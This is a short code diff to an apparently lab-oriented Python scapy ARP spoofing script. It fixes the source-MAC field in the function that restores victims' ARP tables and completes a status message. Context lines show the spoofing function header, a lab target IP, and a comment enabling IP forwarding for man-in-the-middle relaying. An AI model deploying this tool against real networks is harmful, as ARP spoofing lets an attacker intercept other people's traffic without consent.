@@ -21,7 +21,7 @@ def spoof(target_ip, spoof_ip):
 def restore(destination_ip,source_ip):
     destination_mac=get_mac(destination_ip)
     source_mac=get_mac(source_ip)
-    packet=scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip,hwdst=source_mac)
+    packet=scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip,hwsrc=source_mac)
     scapy.send(packet,count=4, verbose=False)
 
 target_ip="10.0.2.15"
@@ -38,7 +38,7 @@ except KeyboardInterrupt:
     print('[+] Detected CTRL + C ..... Resetting ARP tables... Please wait.\n')
     restore(target_ip,gateway_ip)
     restore(gateway_ip,target_ip)
-    print('[+] ')
+    print('[+] Done restoring... ')
 
 
 # in terminal: echo 1 > /proc/sys/net/ipv4/ip_forward
